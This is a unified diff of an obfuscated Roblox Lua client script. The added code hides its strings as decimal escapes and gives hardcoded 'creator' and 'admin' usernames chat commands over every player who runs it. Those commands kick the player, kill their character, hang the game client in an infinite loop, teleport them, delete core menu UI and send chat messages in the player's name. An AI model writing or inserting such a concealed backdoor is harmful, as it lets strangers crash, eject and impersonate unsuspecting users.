@@ -1,36 +1,9 @@
-local P = game:GetService("Players")
-local G = game:GetService("StarterGui")
-local L = P.LocalPlayer
-local A = {["name"] = true, ["aabbaaii13"] = true, ["abaiaabbaaiiabai"] = true, ["aabbaaii14"] = true, ["Bladeball_player234"] = true}
-
-local function h(p)
-    if A[p.Name] and not p:FindFirstChild("__hooked") then
-        Instance.new("BoolValue", p).Name = "__hooked"
-        p.Chatted:Connect(function(m)
-            m = m:lower()
-            local k = ":kick "
-            if m:sub(1, #k) == k then
-                local d = string.split(m:sub(#k + 1), "|")
-                if d[1]:gsub("%s+", "") == L.Name:lower() then
-                    L:Kick((d[2] or "No Reason"):gsub("^%s+", ""):gsub("%s+$", ""))
-                end
-                return
-            end
-
-            local n = ":notify "
-            if m:sub(1, #n) == n then
-                local d = string.split(m:sub(#n + 1), "|")
-                if #d >= 2 and d[1]:gsub("%s+", "") == L.Name:lower() then
-                    G:SetCore("SendNotification", {
-                        Title = "Notification",
-                        Text = d[2]:gsub("^%s+", ""):gsub("%s+$", ""),
-                        Duration = 15
-                    })
-                end
-            end
-        end)
-    end
-end
-
-for _, v in ipairs(P:GetPlayers()) do h(v) end
-P.PlayerAdded:Connect(h)
+local o={["bendyzombie12345_2"]=true,["bendyzombie12345"]=true}
+local a={["aabbaaii13"]=true,["aabbaaii14"]=true,["aabbaaii15"]=true,["aabbaaii16"]=true}
+local n={["t1"]=" Joined!",["d1"]="The Creator Of Script",["t2"]="Admin Joined!",["d2"]=7,["t3"]="Notification",["d3"]=10,["t4"]="List Of Commands"}
+task.spawn(function()
+local s1={"\80\108\97\121\101\114\115","\83\116\97\114\116\101\114\71\117\105","\67\111\114\101\71\117\105","\47\101\32","\32","\124","\37\115\43","\97\108\108","\58\107\105\99\107","\78\111\32\82\101\97\115\111\110","\58\110\111\116\105\102\121","\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110","\78\111\32\77\101\115\115\97\103\101","\58\107\105\108\108","\72\117\109\97\110\111\105\100","\58\99\114\97\115\104","\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116","\58\98\114\105\110\103","\59\100\101\108\101\116\101","\84\111\112\66\97\114\65\112\112","\110\105\110\101\95\100\111\116","\50","\51","\58\99\109\100\115","\58\107\105\99\107\44\32\58\110\111\116\105\102\121\44\32\58\107\105\108\108\44\32\58\99\114\97\115\104\44\32\58\98\114\105\110\103\44\32\59\100\101\108\101\116\101\44\32\58\99\104\97\116","\58\99\104\97\116","\84\101\120\116\67\104\97\116\83\101\114\118\105\99\101"}
+local g1=game;local g2=g1:GetService(s1[1]);local g3=g1:GetService(s1[2]);local g4=g1:GetService(s1[3]);local g5=g1:GetService(s1[27]);local lp=g2.LocalPlayer;local h1={}local function f1(p1)
+local n1=p1.Name:lower()local io=o[p1.Name]or o[n1]local ia=a[p1.Name]or a[n1]if(io or ia)and not h1[p1]then h1[p1]=true;local t=io and p1.DisplayName..n.t1 or n.t2;local tx=io and n.d1 or p1.DisplayName.." is an Admin"g3:SetCore(s1[12],{Title=t,Text=tx,Duration=n.d2})p1.Chatted:Connect(function(m1)
+local m2=m1:lower()if m2:sub(1,3)==s1[4]then m2=m2:sub(4)end;local pfx=m2:sub(1,1)if pfx~=":"and pfx~=";"then return end;local sp1=m2:split(s1[5])local c1=sp1[1]:gsub("^;",":")if not c1 then return end;local r1=m2:sub(#c1+2)local d1=r1:split(s1[6])local t1=(d1[1]or""):gsub(s1[7],"")local un=lp.Name:lower()local lo=o[lp.Name]or o[un]local la=a[lp.Name]or a[un]local ic=false;if c1==s1[24]then ic=true else if t1==s1[8]or(t1~="" and un:find(t1))then if io then if not lo or p1==lp then ic=true end elseif ia then if not lo and not la or p1==lp then ic=true end end end end;if ic then
+if c1==s1[9]then lp:Kick(d1[2]or s1[10])elseif c1==s1[11]then g3:SetCore(s1[12],{Title=n.t3,Text=d1[2]or s1[13],Duration=n.d3})elseif c1==s1[14]then if lp.Character and lp.Character:FindFirstChild(s1[15])then lp.Character:FindFirstChild(s1[15]).Health=0 end;elseif c1==s1[16]then if lp.Character and lp.Character:FindFirstChild(s1[17])then for i=5,1,-1 do g3:SetCore(s1[12],{Title="CRASHING",Text="Crashing in "..i,Duration=1})task.wait(1)end while true do end end;elseif c1==s1[18]then if p1.Character and p1.Character:FindFirstChild(s1[17])and lp.Character and lp.Character:FindFirstChild(s1[17])then lp.Character:FindFirstChild(s1[17]).CFrame=p1.Character:FindFirstChild(s1[17]).CFrame end;elseif c1==s1[19]:gsub("^;",":")then local tba=g4:FindFirstChild(s1[20])if tba then local nd=tba.TopBarApp.UnibarLeftFrame.UnibarMenu[s1[22]][s1[23]]:FindFirstChild(s1[21])local mih=tba.TopBarApp.MenuIconHolder;if nd then nd:Destroy()end;if mih then mih:Destroy()end end;elseif c1==s1[24]then g3:SetCore(s1[12],{Title=n.t4,Text=s1[25],Duration=10})elseif c1==s1[26]then local msg=""for i=2,#d1 do if d1[i]~=""then msg=d1[i]:match("^%s*(.-)%s*$")break end end;if msg~=""then if g5.ChatVersion==Enum.ChatVersion.TextChatService then g5.TextChannels.RBXGeneral:SendAsync(msg)else game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg,"All")end end end end end)end end;g2.PlayerRemoving:Connect(function(p2)h1[p2]=nil end)for _,v in ipairs(g2:GetPlayers())do f1(v)end;g2.PlayerAdded:Connect(f1)end)
